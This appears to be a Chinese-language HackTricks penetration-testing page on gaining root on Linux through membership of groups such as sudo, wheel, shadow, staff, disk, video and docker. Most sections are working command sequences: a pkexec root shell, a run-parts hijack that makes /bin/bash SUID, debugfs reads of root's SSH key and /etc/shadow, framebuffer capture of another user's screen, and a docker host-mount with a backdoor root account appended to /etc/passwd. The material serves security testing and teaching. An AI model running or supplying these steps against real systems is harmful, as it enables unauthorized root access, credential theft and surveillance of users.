# 有趣的组 - Linux 权限提升

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/管理员组

### **PE - 方法 1**

**有时**，**默认情况下（或因为某些软件需要它）**在 **/etc/sudoers** 文件中可以找到一些这些行：
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
这意味着 **任何属于 sudo 或 admin 组的用户都可以以 sudo 身份执行任何操作**。

如果是这种情况，要 **成为 root，你只需执行**：
```
sudo su
```
### PE - 方法 2

查找所有 suid 二进制文件，并检查是否存在二进制文件 **Pkexec**：
```bash
find / -perm -4000 2>/dev/null
```
如果你发现二进制文件 **pkexec 是一个 SUID 二进制文件**，并且你属于 **sudo** 或 **admin**，你可能可以使用 `pkexec` 以 sudo 身份执行二进制文件。\
这是因为通常这些是 **polkit 策略** 中的组。该策略基本上确定了哪些组可以使用 `pkexec`。使用以下命令检查：
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
在那里您将找到哪些组被允许执行 **pkexec**，并且在某些 Linux 发行版中，**sudo** 和 **admin** 组默认出现。

要 **成为 root，您可以执行**：
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
如果你尝试执行 **pkexec** 并且收到这个 **错误**：
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**这不是因为你没有权限，而是因为你没有通过 GUI 连接**。对此问题有一个解决方法在这里: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)。你需要 **2 个不同的 ssh 会话**:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wheel Group

**有时**，**默认情况下**在 **/etc/sudoers** 文件中可以找到这一行：
```
%wheel	ALL=(ALL:ALL) ALL
```
这意味着 **任何属于 wheel 组的用户都可以以 sudo 身份执行任何操作**。

如果是这样，要 **成为 root，你只需执行**：
```
sudo su
```
## Shadow Group

来自 **group shadow** 的用户可以 **read** **/etc/shadow** 文件：
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
所以，阅读文件并尝试**破解一些哈希**。

## 员工组

**staff**: 允许用户在不需要根权限的情况下对系统进行本地修改（`/usr/local`）（请注意，`/usr/local/bin`中的可执行文件在任何用户的PATH变量中，并且它们可能会“覆盖” `/bin` 和 `/usr/bin` 中同名的可执行文件）。与更相关于监控/安全的“adm”组进行比较。 [\[source\]](https://wiki.debian.org/SystemGroups)

在debian发行版中，`$PATH`变量显示`/usr/local/`将以最高优先级运行，无论您是否是特权用户。
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
如果我们可以劫持 `/usr/local` 中的一些程序，我们就可以轻松获得 root 权限。

劫持 `run-parts` 程序是一种轻松获得 root 权限的方法，因为大多数程序会像 (crontab, 当 ssh 登录时) 一样运行 `run-parts`。
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
或当新的ssh会话登录时。
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**利用**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## 磁盘组

此权限几乎**等同于根访问**，因为您可以访问机器内部的所有数据。

文件：`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
请注意，使用 debugfs 你也可以 **写入文件**。例如，要将 `/tmp/asd1.txt` 复制到 `/tmp/asd2.txt`，你可以执行：
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
然而，如果你尝试**写入由 root 拥有的文件**（如 `/etc/shadow` 或 `/etc/passwd`），你将会遇到“**权限被拒绝**”错误。

## 视频组

使用命令 `w` 你可以找到**谁登录了系统**，它将显示如下输出：
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** 表示用户 **yossi 正在物理上** 登录到机器上的终端。

**video group** 有权查看屏幕输出。基本上，你可以观察屏幕。为了做到这一点，你需要 **抓取当前屏幕上的图像** 的原始数据，并获取屏幕使用的分辨率。屏幕数据可以保存在 `/dev/fb0` 中，你可以在 `/sys/class/graphics/fb0/virtual_size` 找到该屏幕的分辨率。
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
要**打开** **原始图像**，您可以使用**GIMP**，选择**`screen.raw`**文件，并选择文件类型为**原始图像数据**：

![](<../../../images/image (463).png>)

然后将宽度和高度修改为屏幕上使用的值，并检查不同的图像类型（并选择显示屏幕效果更好的那个）：

![](<../../../images/image (317).png>)

## Root Group

看起来默认情况下**root组的成员**可以访问**修改**某些**服务**配置文件或某些**库**文件或**其他有趣的东西**，这些都可以用来提升权限...

**检查root成员可以修改哪些文件**：
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker 组

您可以**将主机的根文件系统挂载到实例的卷**，因此当实例启动时，它会立即加载一个 `chroot` 到该卷。这实际上使您在机器上获得了 root 权限。
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
最后，如果你不喜欢之前的任何建议，或者由于某种原因它们不起作用（docker api 防火墙？），你可以尝试**运行一个特权容器并从中逃逸**，如这里所述：

{{#ref}}
../docker-security/
{{#endref}}

如果你对 docker socket 有写权限，请阅读[**这篇关于如何通过滥用 docker socket 提升权限的文章**](../index.html#writable-docker-socket)**。**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd 组

{{#ref}}
./
{{#endref}}

## Adm 组

通常，**`adm`** 组的**成员**有权限**读取**位于 _/var/log/_ 中的日志文件。\
因此，如果你已经攻陷了该组中的用户，你应该确实**查看日志**。

## Auth 组

在 OpenBSD 中，**auth** 组通常可以在 _**/etc/skey**_ 和 _**/var/db/yubikey**_ 文件夹中写入（如果它们被使用）。\
这些权限可能会被以下漏洞滥用，以**提升权限**到 root：[https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{{#include ../../../banners/hacktricks-training.md}}
